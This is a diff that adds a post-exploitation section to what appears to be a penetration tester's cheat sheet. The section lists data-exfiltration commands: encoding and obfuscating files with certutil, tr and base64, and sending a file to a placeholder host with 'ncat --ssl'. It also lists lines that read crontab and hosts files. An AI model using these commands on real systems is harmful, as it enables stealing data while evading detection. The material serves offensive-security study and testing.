@@ -467,11 +467,37 @@ print s.recv(1024)   #print response
 s.close()         #close the connection
 
 
+##POST EXPLOITATION
+
+/etc/hosts
+
+Data Exfiltration
+Session Transcript
+
+ ssh <user>@<host> | tee
+
+Obfuscation (Windows)
+
+type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+certutil -encode <file> encoded.b64
+
+Obfuscation (Linux)
+
+cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+cat <file>> | base64
+
+Encrypted Transport
+
+scp <source> <destination>
+ncat --ssl <ip> <port> < <file>
 
 
+find things already running :
+cat /etc/crontab
+/etc/hosts
 
-
-
+crontab guru
+crontab cheat sheet
 
 
 
